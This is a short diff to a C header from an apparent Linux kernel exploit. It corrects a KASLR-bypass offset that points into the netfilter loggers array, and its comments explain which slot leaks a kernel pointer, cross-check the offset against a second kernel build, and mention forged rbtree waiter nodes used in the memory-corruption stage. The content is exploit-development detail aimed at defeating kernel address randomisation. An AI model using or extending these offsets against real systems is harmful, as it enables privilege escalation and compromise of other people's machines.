@@ -140,7 +140,21 @@
 
 // ── Slide references (KASLR bypass anchors) ─────────────────────────────
 #define SLIDE_NFULNL_LOGGER_OFF     0x020129d0ULL
-#define SLIDE_LOGGERS_0_1_OFF       0x02012918ULL
+
+// &loggers[0][1], not the `loggers` symbol itself. loggers is
+//   struct nf_logger *loggers[NFPROTO_NUMPROTO][NF_LOG_TYPE_MAX]
+// so [0][1] is one pointer in: the NFPROTO_UNSPEC / NF_LOG_TYPE_ULOG slot,
+// which nfnetlink_log fills with &nfulnl_logger at registration. (The image
+// confirms the type: nfulnl_logger.type reads 1 = NF_LOG_TYPE_ULOG.) Slot
+// [0][0] is the LOG-type entry, which nothing registers and which stays zero —
+// pointing the leak there makes boot_id read 16 zero bytes, which is exactly
+// what a run reported before this was corrected.
+//
+// Cross-checked against blazer: taking its 0x021221b0 as loggers+8 puts its
+// loggers at 0x021221a8, giving nfulnl_logger - loggers = 0xb8 — the same
+// 0xb8 measured here. Two different kernel lines agreeing on that distance
+// confirms both the array layout and that blazer's value is also loggers+8.
+#define SLIDE_LOGGERS_0_1_OFF       0x02012920ULL /* loggers(0x02012918) + 8 */
 
 // Despite the name this is not about boot_id randomness. slide.c plants it
 // as the rb_left pointer of the forged waiter's rbtree nodes, so the tree
